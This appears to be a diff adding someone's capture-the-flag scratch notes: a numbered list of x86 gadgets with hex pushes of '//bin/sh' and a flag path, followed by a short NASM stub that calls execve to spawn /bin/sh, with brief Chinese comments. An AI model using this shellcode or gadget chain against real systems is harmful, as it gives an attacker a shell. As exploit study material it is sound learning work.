@@ -1,0 +1,61 @@
+0.	int 0x80 
+	pop ebp 
+	pop edi 
+	pop esi 
+	pop ebx
+============================
+1.	pop ebx 
+	pop ebp 
+	xor eax,eax    eax置0
+============================
+2.	sub ecx,eax   -----
+	pop ebp
+============================
+3.	mov edx,eax 
+	pop ebx
+============================
+4.	pop ecx 
+	pop eax
+============================
+5.	mov (esp),edx
+============================
+6.	pop edx 
+	pop ecx 
+	pop edx
+============================
+7.	add ecx,eax 
+	pop ebx
+============================
+8.	add eax,0x2           1,8,8,8,8,8,8,   eax = 0x0b
+============================
+9.	push esp 
+	push ebp
+============================
+10.	push 0x68732f6e  hs/n  n/sh       //bin/sh     ---------------------------------------------
+	push 0x69622f2f  ib//  //bi
+============================
+11.	push 0x67616c66   galf  flag      /home//cftf//flaglag
+	push 0x2f2f6674   //ft  tf//
+	push 0x632f2f65   c//e  e//c
+	push 0x6d6f682f   moh/  /hom
+============================
+12.	push 1 
+	push 2
+============================
+13.	push eax
+============================
+
+
+eax = 0x0b  ebx = /bin/sh ecx = 0  edx = 0 	esi
+
+global _start
+_start:
+mov eax,0 ;eax置0
+mov edx,0 ;edx置0
+push edx
+push "/sh"
+push "/bin"  ;将/bin/sh存入栈中
+mov ebx,esp  ;ebx指向/bin/sh字符串
+xor eax,eax  ; 1
+mov al,0Bh   ; 8,8,8,8,8,8
+int 80h      ; 0
